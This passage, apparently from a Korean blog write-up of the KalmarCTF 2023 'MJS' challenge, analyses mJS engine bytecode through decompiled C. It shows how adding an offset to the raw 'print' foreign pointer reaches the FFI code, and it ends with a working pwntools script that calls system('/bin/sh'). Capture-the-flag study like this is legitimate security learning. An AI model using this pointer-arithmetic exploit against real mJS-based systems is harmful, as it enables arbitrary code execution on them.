  OP_CREATE,            /* ( key obj -- ) */
  OP_EXPR,              /* ( ... -- a ) */
  OP_APPEND,            /* ( a b -- ) */
  OP_SET_ARG,           /* ( a -- a ) */
  OP_NEW_SCOPE,         /* ( -- ) */
  OP_DEL_SCOPE,         /* ( -- ) */
  OP_CALL,              /* ( func param1 param2 ... num_params -- result ) */
  OP_RETURN,            /* ( -- ) */
  OP_LOOP,         /* ( -- ) Push break & continue addresses to loop_labels */
  OP_BREAK,        /* ( -- ) */
  OP_CONTINUE,     /* ( -- ) */
  OP_SETRETVAL,    /* ( a -- ) */
  OP_EXIT,         /* ( -- ) */
  OP_BCODE_HEADER, /* ( -- ) */
  OP_ARGS,         /* ( -- ) Mark the beginning of function call arguments */
  OP_FOR_IN_NEXT,  /* ( name obj iter_ptr -- name obj iter_ptr_next ) */
  OP_MAX'''.replace(' ','')

str_ = (str_.split(','))
OPCODE = [36, 11, 9, 22, 37, 11, 29, 35]
# OPCODE =[36, 11, 9, 22, 35]
# OPCODE = [36, 11, 10, 23, 11, 9, 11, 9, 22, 24]
for op in OPCODE:
    k=0
    for i in str_:
        if op == k:
            print(i[i.find("OP_"):] + ' = '+ hex(k))
        k+=1
```
```c
root@ed1ff428eb33 ~/Desktop/Kalmar/MJS - KalmarCTF
❯ python3 print_opcode.py
OP_BCODE_HEADER = 0x24
OP_PUSH_STR = 0xb
OP_FIND_SCOPE = 0x9
OP_GET = 0x16
OP_ARGS = 0x25
OP_PUSH_STR = 0xb
OP_CALL = 0x1d
OP_EXIT = 0x23
```
```c
      case 0xBu:
        length = cs_varint_decode_unsafe(&code[i + 1], &llen_4);
        v55 = mjsa;
        v16 = mjs_mk_string(mjsa, (const char *)&code[i + 1 + llen_4], length, 1);
        mjs_push(v55, v16);
        i += length + llen_4;
        goto LABEL_93;
```
OP_PUSH_STR은 그냥 문자열을 약간의 가공을 해서 스택에 push하는 명령이다.
```c
0xfff700746e697270
```
뒤에는 그냥 아스키고 앞에 0xfff7을 추가해준다.
길이에 따라 로직이 다르지만, print 문자열에 한에서는 위 값이 push된다.
```c
void __cdecl mjs_push(mjs *mjs, mjs_val_t v)
{
  push_mjs_val(&mjs->stack, v);
}
```
```c
void __cdecl push_mjs_val(mbuf *m, mjs_val_t v)
{
  mjs_val_t va; // [rsp+0h] [rbp-10h] BYREF
  mbuf *ma; // [rsp+8h] [rbp-8h]

  ma = m;
  va = v;
  mbuf_append(m, &va, 8uLL);
}
```
```c
size_t __cdecl mbuf_append(mbuf *a, const void *buf, size_t len)
{
  return mbuf_insert(a, a->len, buf, len);
}
```
OP_FIND_SCOPE는 현재 스코프를 찾는 명령이다.
OP_CREATE 같은 명령을 수행할때, SCOPE에 값이 추가된다.
```c
0xfff1561eb4251558
```
vm stack에 push 되는 값은 위와 같은 주소값이다.
0xfff1이 마스크? 이고 하위 6바이트가 주소로 쓰인다. 
```c
int __cdecl mjs_is_object(mjs_val_t v)
{
  bool v2; // [rsp+1h] [rbp-9h]

  v2 = 1;
  if ( (v & 0xFFFF000000000000LL) != 0xFFF1000000000000LL )
    return (v & 0xFFFF000000000000LL) == 0xFFFC000000000000LL;
  return v2;
}
```
mjs_is_object 함수가 비교하는 것을 보면, 오브젝트임을 알 수 있다.
```c
int mjs_is_object(mjs_val_t v) {
  return (v & MJS_TAG_MASK) == MJS_TAG_OBJECT ||
         (v & MJS_TAG_MASK) == MJS_TAG_ARRAY;
}
```

OP_GET은 함수의 주소를 찾을때 사용하는 명령어이다.
```c
	  case 0x16u:
        obj_0 = mjs_pop(mjsa);                  // SCOPE 
        key_1 = mjs_pop(mjsa);                  // ENCODED STR
        val_0 = 0xFFF3000000000000LL;
        if ( !getprop_builtin(mjsa, obj_0, key_1, &val_0) )// NOT PROPERTY BUILTIN
        {
          if ( mjs_is_object(obj_0) )
            val_0 = mjs_get_v_proto(mjsa, obj_0, key_1);// OBJECT -> GET PROTO
          else
            mjs_prepend_errorf(mjsa, MJS_TYPE_ERROR, "type error");
        }
        mjs_push(mjsa, val_0);
        if ( prev_opcode == 9 )
          mjsa->vals.last_getprop_obj = 0xFFF3000000000000LL;
        else
          mjsa->vals.last_getprop_obj = obj_0;
        goto LABEL_93;
```
그 scope의 object에서 key값으로 값을 찾아서 proto?를 얻어서 vm stack에 push한다.

OP_ARGS는 그냥 인자를 맞춰주는 부분이다.
분석은 안했다.

OP_CALL은 함수를 호출해준다.
```c
      case 0x1Du:
        retval_stack_idx = vtop(&mjsa->arg_stack);
        func_pos = mjs_get_int(mjsa, retval_stack_idx) - 1;
        func = vptr(&mjsa->stack, func_pos);    // get pointer
        mjs_pop_val(&mjsa->arg_stack);
        if ( mjs_is_function(*func) )
        {
          call_stack_push_frame(mjsa, i + bp_0.start_idx, retval_stack_idx);
          off_call = mjs_get_func_addr(*func) - 1;
          bp_0 = *mjs_bcode_part_get_by_offset(mjsa, off_call);
          code = (const uint8_t *)bp_0.data.p;
          i = off_call - bp_0.start_idx;
          *func = 0xFFF3000000000000LL;
        }
        else if ( mjs_is_ffi_sig(*func) )
        {
          call_stack_push_frame(mjsa, i + bp_0.start_idx, retval_stack_idx);
          mjs_ffi_call2(mjsa);
          call_stack_restore_frame(mjsa);
        }
        else if ( mjs_is_foreign(*func) )
        {
          call_stack_push_frame(mjsa, i + bp_0.start_idx, retval_stack_idx);
          ptr = (void (__fastcall *)(mjs *))mjs_get_ptr(mjsa, *func);
          ptr(mjsa);
          call_stack_restore_frame(mjsa);
        }
        else
        {
          mjs_set_errorf(mjsa, MJS_TYPE_ERROR, "calling non-callable");
        }
        goto LABEL_93;
```
mjs_print는 foreign이다.
```c
int __cdecl mjs_is_foreign(mjs_val_t v)
{
  return (v & 0xFFFF000000000000LL) == 0xFFF2000000000000LL;
}
```
OP_GET에서 가져온 함수의 주소의 마스크가 0xfff2이기 때문이다.
```c
void *__cdecl mjs_get_ptr(mjs *mjs, mjs_val_t v)
{
  if ( mjs_is_foreign(v) )
    return get_ptr(v);
  else
    return 0LL;
}
```
```c
void *__cdecl get_ptr(mjs_val_t v)
{
  return (void *)(v & 0xFFFFFFFFFFFFLL);
}
```
실제로 ptr을 가져올때 마스크는 빼고 본다.
즉 실제 주소를 가져와서 그냥 호출한다.

OP_EXPR은 어떤 변수에 저장할때 있었던 OPCODE이다.
OP_EXPR도 한번 살펴보면, 다음과 같다.
```c
      case 0x18u:
        op = code[i + 1];
        exec_expr(mjsa, op);
        ++i;
```
```c
void __cdecl exec_expr(mjs *mjs, int op)
{
  mjs_val_t v2; // rax
  mjs_val_t v3; // rax
  mjs_val_t v4; // rax
  int is_truthy; // eax
  mjs_val_t v6; // rax
  mjs_val_t v7; // rax
  mjs_val_t v8; // rax
  int v9; // eax
  mjs_val_t v10; // rax
  int v11; // eax
  mjs_val_t v12; // rax
  mjs_val_t v13; // rax
  mjs_val_t v14; // rax
  mjs_val_t v15; // rax
  mjs_val_t v16; // rax
  mjs_val_t v17; // rax
  mjs_val_t v18; // rax
  mjs_val_t v19; // rax
  mjs_val_t v20; // rax
  mjs_val_t v21; // rax
  mjs_val_t v22; // rax
  mjs_val_t v23; // rax
  mjs_val_t v24; // rax
  mjs_val_t v25; // rax
  mjs_val_t v26; // rax
  mjs_val_t v27; // rax
  mjs_val_t v28; // rax
  mjs_val_t v29; // rax
  const char *v30; // rax
  mjs_val_t v31; // rax
  mjs_val_t v32; // [rsp+18h] [rbp-228h]
  mjs_val_t v; // [rsp+28h] [rbp-218h]
  mjs_val_t v34; // [rsp+38h] [rbp-208h]
  mjs_val_t v35; // [rsp+48h] [rbp-1F8h]
  mjs_val_t v_2; // [rsp+110h] [rbp-130h]
  mjs_val_t key_3; // [rsp+118h] [rbp-128h]
  mjs_val_t obj_3; // [rsp+120h] [rbp-120h]
  mjs_val_t v_1; // [rsp+128h] [rbp-118h]
  mjs_val_t key_2; // [rsp+130h] [rbp-110h]
  mjs_val_t obj_2; // [rsp+138h] [rbp-108h]
  mjs_val_t v1_0; // [rsp+140h] [rbp-100h]
  mjs_val_t key_1; // [rsp+150h] [rbp-F0h]
  mjs_val_t obj_1; // [rsp+158h] [rbp-E8h]
  mjs_val_t v1; // [rsp+160h] [rbp-E0h]
  mjs_val_t key_0; // [rsp+170h] [rbp-D0h]
  mjs_val_t obj_0; // [rsp+178h] [rbp-C8h]
  unsigned int ival; // [rsp+188h] [rbp-B8h]
  int ikey; // [rsp+18Ch] [rbp-B4h]
  mjs_val_t key; // [rsp+190h] [rbp-B0h]
  mjs_val_t obj; // [rsp+198h] [rbp-A8h]
  mjs_val_t val_0; // [rsp+1A0h] [rbp-A0h]
  double a_7; // [rsp+1A8h] [rbp-98h]
  double b_5; // [rsp+1B0h] [rbp-90h]
  double a_6; // [rsp+1B8h] [rbp-88h]
  double b_4; // [rsp+1C0h] [rbp-80h]
  double a_5; // [rsp+1C8h] [rbp-78h]
  double b_3; // [rsp+1D0h] [rbp-70h]
  double a_4; // [rsp+1D8h] [rbp-68h]
  double b_2; // [rsp+1E0h] [rbp-60h]
  mjs_val_t b_1; // [rsp+1E8h] [rbp-58h]
  mjs_val_t a_3; // [rsp+1F0h] [rbp-50h]
  mjs_val_t b_0; // [rsp+1F8h] [rbp-48h]
  mjs_val_t a_2; // [rsp+200h] [rbp-40h]
  double a_1; // [rsp+208h] [rbp-38h]
  mjs_val_t val; // [rsp+210h] [rbp-30h]
  double a_0; // [rsp+218h] [rbp-28h]
  mjs_val_t a; // [rsp+220h] [rbp-20h]
  mjs_val_t b; // [rsp+228h] [rbp-18h]

  switch ( op )
  {
    case 4:
    case 20:
    case 50:
      return;
    case 5:
      val_0 = mjs_pop(mjs);                     // function PTR  -foreign
      obj = mjs_pop(mjs);                       // scope? 
      key = mjs_pop(mjs);                       // key name str
      if ( mjs_is_object(obj) )
      {
        mjs_set_v(mjs, obj, key, val_0);        // set foreign ptr RAW
      }
      else if ( mjs_is_foreign(obj) )
      {
        ikey = mjs_get_int(mjs, key);
        ival = mjs_get_int(mjs, val_0);
        if ( !mjs_is_number(key) )
        {
          mjs_prepend_errorf(mjs, MJS_TYPE_ERROR, "index must be a number");
          mjs_push(mjs, 0xFFF3000000000000LL);
          return;
        }
        if ( mjs_is_number(val_0) && ival < 0x100 )
        {
          *((_BYTE *)mjs_get_ptr(mjs, obj) + ikey) = ival;
        }
        else
        {
          mjs_prepend_errorf(mjs, MJS_TYPE_ERROR, "only number 0 .. 255 can be assigned");
          val_0 = 0xFFF3000000000000LL;
        }
      }
      else
      {
        mjs_prepend_errorf(mjs, MJS_TYPE_ERROR, "unsupported object type");
      }
      mjs_push(mjs, val_0);
      return;
    case 12:
    case 13:
    case 14:
    case 15:
    case 16:
    case 17:
    case 18:
    case 19:
    case 26:
    case 27:
    case 48:
      b = mjs_pop(mjs);
      a = mjs_pop(mjs);
      v2 = do_op(mjs, a, b, op);
      mjs_push(mjs, v2);
      return;
    case 22:
      val = mjs_pop(mjs);
      is_truthy = mjs_is_truthy(mjs, val);
      v6 = mjs_mk_boolean(mjs, is_truthy == 0);
      mjs_push(mjs, v6);
      return;
    case 23:
      v7 = mjs_pop(mjs);
      a_1 = mjs_get_double(mjs, v7);
      v8 = mjs_mk_number(mjs, (double)~(int)a_1);
      mjs_push(mjs, v8);
      return;
    case 24:
      v13 = mjs_pop(mjs);
      b_2 = mjs_get_double(mjs, v13);
      v14 = mjs_pop(mjs);
      a_4 = mjs_get_double(mjs, v14);
      v15 = mjs_mk_boolean(mjs, b_2 > a_4);
      mjs_push(mjs, v15);
      return;
    case 25:
      v16 = mjs_pop(mjs);
      b_3 = mjs_get_double(mjs, v16);
      v17 = mjs_pop(mjs);
      a_5 = mjs_get_double(mjs, v17);
      v18 = mjs_mk_boolean(mjs, a_5 > b_3);
      mjs_push(mjs, v18);
      return;
    case 28:
      obj_2 = mjs_pop(mjs);
      key_2 = mjs_pop(mjs);
      if ( !mjs_is_object(obj_2) || !mjs_is_string(key_2) )
        goto LABEL_32;
      v = mjs_get_v(mjs, obj_2, key_2);
      v27 = mjs_mk_number(mjs, 1.0);
      v_1 = do_op(mjs, v, v27, 14);
      mjs_set_v(mjs, obj_2, key_2, v_1);
      mjs_push(mjs, v_1);
      return;
    case 29:
      obj_3 = mjs_pop(mjs);
      key_3 = mjs_pop(mjs);
      if ( !mjs_is_object(obj_3) || !mjs_is_string(key_3) )
        goto LABEL_28;
      v32 = mjs_get_v(mjs, obj_3, key_3);
      v28 = mjs_mk_number(mjs, 1.0);
      v_2 = do_op(mjs, v32, v28, 13);
      mjs_set_v(mjs, obj_3, key_3, v_2);
      mjs_push(mjs, v_2);
      return;
    case 30:
      op_assign(mjs, 13);
      return;
    case 31:
      op_assign(mjs, 14);
      return;
    case 32:
      op_assign(mjs, 12);
      return;
    case 33:
      op_assign(mjs, 15);
      return;
    case 34:
      op_assign(mjs, 17);
      return;
    case 35:
      op_assign(mjs, 18);
      return;
    case 36:
      op_assign(mjs, 16);
      return;
    case 37:
      op_assign(mjs, 19);
      return;
    case 38:
      mjs_set_errorf(mjs, MJS_NOT_IMPLEMENTED_ERROR, "Use ===, not ==");
      return;
    case 39:
      mjs_set_errorf(mjs, MJS_NOT_IMPLEMENTED_ERROR, "Use !==, not !=");
      return;
    case 40:
      v19 = mjs_pop(mjs);
      b_4 = mjs_get_double(mjs, v19);
      v20 = mjs_pop(mjs);
      a_6 = mjs_get_double(mjs, v20);
      v21 = mjs_mk_boolean(mjs, b_4 >= a_6);
      mjs_push(mjs, v21);
      return;
    case 41:
      v22 = mjs_pop(mjs);
      b_5 = mjs_get_double(mjs, v22);
      v23 = mjs_pop(mjs);
      a_7 = mjs_get_double(mjs, v23);
      v24 = mjs_mk_boolean(mjs, a_7 >= b_5);
      mjs_push(mjs, v24);
      return;
    case 44:
      a_2 = mjs_pop(mjs);
      b_0 = mjs_pop(mjs);
      v9 = check_equal(mjs, a_2, b_0);
      v10 = mjs_mk_boolean(mjs, v9);
      mjs_push(mjs, v10);
      return;
    case 45:
      a_3 = mjs_pop(mjs);
      b_1 = mjs_pop(mjs);
      v11 = check_equal(mjs, a_3, b_1);
      v12 = mjs_mk_boolean(mjs, v11 == 0);
      mjs_push(mjs, v12);
      return;
    case 46:
      op_assign(mjs, 26);
      return;
    case 47:
      op_assign(mjs, 27);
      return;
    case 49:
      op_assign(mjs, 48);
      return;
    case 51:
      v3 = mjs_pop(mjs);
      a_0 = mjs_get_double(mjs, v3);
      v4 = mjs_mk_number(mjs, COERCE_DOUBLE(*(_QWORD *)&a_0 ^ 0x8000000000000000LL));
      mjs_push(mjs, v4);
      return;
    case 52:
      obj_0 = mjs_pop(mjs);
      key_0 = mjs_pop(mjs);
      if ( mjs_is_object(obj_0) && mjs_is_string(key_0) )
      {
        v35 = mjs_get_v(mjs, obj_0, key_0);
        v25 = mjs_mk_number(mjs, 1.0);
        v1 = do_op(mjs, v35, v25, 13);
        mjs_set_v(mjs, obj_0, key_0, v1);
        mjs_push(mjs, v35);
      }
      else
      {
LABEL_28:
        mjs_set_errorf(mjs, MJS_TYPE_ERROR, "invalid operand for ++");
      }
      return;
    case 53:
      obj_1 = mjs_pop(mjs);
      key_1 = mjs_pop(mjs);
      if ( mjs_is_object(obj_1) && mjs_is_string(key_1) )
      {
        v34 = mjs_get_v(mjs, obj_1, key_1);
        v26 = mjs_mk_number(mjs, 1.0);
        v1_0 = do_op(mjs, v34, v26, 14);
        mjs_set_v(mjs, obj_1, key_1, v1_0);
        mjs_push(mjs, v34);
      }
      else
      {
LABEL_32:
        mjs_set_errorf(mjs, MJS_TYPE_ERROR, "invalid operand for --");
      }
      return;
    case 227:
      v29 = mjs_pop(mjs);
      v30 = mjs_typeof(v29);
      v31 = mjs_mk_string(mjs, v30, 0xFFFFFFFFFFFFFFFFLL, 1);
      mjs_push(mjs, v31);
      return;
    default:
      if ( cs_log_print_prefix(LL_ERROR, "src/mjs_exec.c", 431) )
        cs_log_printf("Unknown expr: %d", (unsigned int)op);
      return;
  }
}
```
scope의 변수에 넣어주는 기능도 수행한다.
나머진 제대로 분석안했다.
## Exploitation
파싱할때 ()를 통해서 함수를 호출하는 바이트 코드를 점화할 수 있다.
exec_expr에서 함수 포인터가 위에 마스크를 달고 raw 하게 저장됨을 알 수 있다.
사실 아주 당연한 내용이지만, js 엔진 건드려본적이 없어서 잘 몰랐다.
```c
    case 5:
      val_0 = mjs_pop(mjs);                     // function PTR  -foreign
      obj = mjs_pop(mjs);                       // scope? 
      key = mjs_pop(mjs);                       // key name str
      if ( mjs_is_object(obj) )
      {
        mjs_set_v(mjs, obj, key, val_0);        // set foreign ptr RAW
      }
```
```c
mjs_err_t __cdecl mjs_set_v(mjs *mjs, mjs_val_t obj, mjs_val_t name, mjs_val_t val)
{
  return mjs_set_internal(mjs, obj, name, 0LL, 0LL, val);
}
```
```c
mjs_err_t __cdecl mjs_set_internal(
        mjs *mjs,
        mjs_val_t obj,
        mjs_val_t name_v,
        char *name,
        size_t name_len,
        mjs_val_t val)
{
  mjs_object *o; // [rsp+8h] [rbp-58h]
  int need_free; // [rsp+14h] [rbp-4Ch] BYREF
  mjs_property *p; // [rsp+18h] [rbp-48h]
  mjs_err_t rcode; // [rsp+24h] [rbp-3Ch]
  mjs_val_t vala; // [rsp+28h] [rbp-38h]
  size_t name_lena; // [rsp+30h] [rbp-30h] BYREF
  char *namea; // [rsp+38h] [rbp-28h] BYREF
  mjs_val_t name_va; // [rsp+40h] [rbp-20h] BYREF
  mjs_val_t obja; // [rsp+48h] [rbp-18h]
  mjs *mjsa; // [rsp+50h] [rbp-10h]

  mjsa = mjs;
  obja = obj;
  name_va = name_v;
  namea = name;
  name_lena = name_len;
  vala = val;
  rcode = MJS_OK;
  need_free = 0;
  if ( name )
  {
    name_va = 0xFFF3000000000000LL;
  }
  else
  {
    rcode = mjs_to_string(mjsa, &name_va, &namea, &name_lena, &need_free);
    if ( rcode )
      goto clean;
  }
  p = mjs_get_own_property(mjsa, obja, namea, name_lena);
  if ( !p )
  {
    if ( !mjs_is_object(obja) )
      return 2;
    if ( !mjs_is_string(name_va) )
      name_va = mjs_mk_string(mjsa, namea, name_lena, 1);
    p = mjs_mk_property(mjsa, name_va, vala);
    o = get_object_struct(obja);
    p->next = o->properties;
    o->properties = p;
  }
  p->value = vala;
clean:
  if ( need_free )
  {
    free(namea);
    namea = 0LL;
  }
  return rcode;
}
```
```c
mjs_property *__cdecl mjs_mk_property(mjs *mjs, mjs_val_t name, mjs_val_t value)
{
  mjs_property *result; // rax

  result = new_property(mjs);
  result->next = 0LL;
  result->name = name;
  result->value = value;
  return result;
}
```
value가 그대로 저장된다.
이걸로 scope에 foreign 함수 포인터를 raw하게 저장시킬 수 있다.
이제 여기서 함수 포인터에 대한 연산을 수행할 수 있다.
do_op 함수의 일부 코드를 보면 왜 가능한지 알 수 있다.
```c
    } else if (mjs_is_foreign(a) || mjs_is_foreign(b)) {
      /*
       * When one of the operands is a pointer, only + and - are supported,
       * and the result is a pointer.
       */
      if (op != TOK_MINUS && op != TOK_PLUS) {
        mjs_prepend_errorf(mjs, MJS_TYPE_ERROR, "invalid operands");
      }
      is_result_ptr = 1;
```
하나만 foreign pointer를 주고 그냥 상수를 더하면 된다.
```c
 ► 0x5647fc468aec <exec_expr+124>    call   do_op                <do_op>
        rdi: 0x5647fe14f2a0 ◂— 0x0
        rsi: 0xfff25647fc465660
        rdx: 0x403e000000000000
        rcx: 0xd
```
실제로 연산이 될때 raw 하게 들어가는 것을 볼 수 있다.
do_op에서는 do_arith_op을 호출한다.
```c
static double do_arith_op(double da, double db, int op, bool *resnan) {
  *resnan = false;

  if (isnan(da) || isnan(db)) {
    *resnan = true;
    return 0;
  }
  /* clang-format off */
  switch (op) {
    case TOK_MINUS:   return da - db;
    case TOK_PLUS:    return da + db;
    case TOK_MUL:     return da * db;
    case TOK_DIV:
      if (db != 0) {
        return da / db;
      } else {
        /* TODO(dfrank): add support for Infinity and return it here */
        *resnan = true;
        return 0;
      }
    case TOK_REM:
      /*
       * TODO(dfrank): probably support remainder operation as it is in JS
       * (which works with non-integer divisor).
       */
      db = (int) db;
      if (db != 0) {
        bool neg = false;
        if (da < 0) {
          neg = true;
          da = -da;
        }
        if (db < 0) {
          db = -db;
        }
        da = (double) ((int64_t) da % (int64_t) db);
        if (neg) {
          da = -da;
        }
        return da;
      } else {
        *resnan = true;
        return 0;
      }
    case TOK_AND:     return (double) ((int64_t) da & (int64_t) db);
    case TOK_OR:      return (double) ((int64_t) da | (int64_t) db);
    case TOK_XOR:     return (double) ((int64_t) da ^ (int64_t) db);
    case TOK_LSHIFT:  return (double) ((int64_t) da << (int64_t) db);
    case TOK_RSHIFT:  return (double) ((int64_t) da >> (int64_t) db);
    case TOK_URSHIFT: return (double) ((uint32_t) da >> (uint32_t) db);
  }
  /* clang-format on */
  *resnan = true;
  return 0;
}
```
그대로 연산이 되는데 상위 2바이트를 침범하면, type confusion?도 가능할 것 같다.
어쨌든 여기서 foreign pointer와 연산이 되면, 다른 함수를 호출할 수 있다.

상위 2바이트만 안건들면 그대로 연산이 되고 0xfff2가 남아서 foreign pointer로 인식되고 OP_CALL로 함수 포인터를 호출할 수 있다.
SCOPE에 그대로 저장되기 때문에 그냥 호출하면 된다.

patch.diff에서 ffi 등록하는 코드를 지웠지만, ffi의 코드는 남아있기 때문에 ffi로 점프하면 된다.
```c
mjs_err_t __cdecl mjs_ffi_call(mjs *mjs)
```
mjs_ffi_call로 점프해주면 된다.
```c
mjs_ffi_ctype_t __cdecl parse_cval_type(mjs *mjs, const char *s, const char *e)
{
  bool v4; // [rsp+Eh] [rbp-32h]
  bool v5; // [rsp+Fh] [rbp-31h]
  mg_str ms; // [rsp+10h] [rbp-30h] BYREF
  const char *ea; // [rsp+20h] [rbp-20h]
  const char *sa; // [rsp+28h] [rbp-18h]
  mjs *mjsa; // [rsp+30h] [rbp-10h]

  mjsa = mjs;
  sa = s;
  ea = e;
  memset(&ms, 0, sizeof(ms));
  while ( 1 )
  {
    v5 = 0;
    if ( sa < ea )
      v5 = ((*__ctype_b_loc())[*sa] & 0x2000) != 0;
    if ( !v5 )
      break;
    ++sa;
  }
  while ( 1 )
  {
    v4 = 0;
    if ( ea > sa )
      v4 = ((*__ctype_b_loc())[*(ea - 1)] & 0x2000) != 0;
    if ( !v4 )
      break;
    --ea;
  }
  ms.p = sa;
  ms.len = ea - sa;
  if ( !mg_vcmp(&ms, "void") )
    return 0;
  if ( !mg_vcmp(&ms, "userdata") )
    return 1;
  if ( !mg_vcmp(&ms, "int") )
    return 3;
  if ( !mg_vcmp(&ms, "bool") )
    return 4;
  if ( !mg_vcmp(&ms, "double") )
    return 5;
  if ( !mg_vcmp(&ms, "float") )
    return 6;
  if ( !mg_vcmp(&ms, "char*") || !mg_vcmp(&ms, "char *") )
    return 7;
  if ( !mg_vcmp(&ms, "void*") || !mg_vcmp(&ms, "void *") )
    return 8;
  if ( !mg_vcmp(&ms, "struct mg_str") )
    return 10;
  if ( !mg_vcmp(&ms, "struct mg_str *") || !mg_vcmp(&ms, "struct mg_str*") )
    return 9;
  mjs_prepend_errorf(mjsa, MJS_TYPE_ERROR, "failed to parse val type \"%.*s\"", LODWORD(ms.len), ms.p);
  return 11;
}
```
이거 보고 잘 맞춰서 세팅해준다음에, system /bin/sh를 호출하면 된다.
offset 잘 계산하면 system 주소를 넣어줄 수 있다.
### Exploit script
익스플로잇이 되게 화가 난다.

```python
from pwn import * 
off = 0x6ab0
payload = 'let a = print;a+=0x6ab0;a("int system(char*)")("/bin/sh")'
p = process(["./mjs","-e",payload])
p.interactive()
```
![](/blog/Kalmar_CTF_2023_MJS/image.png)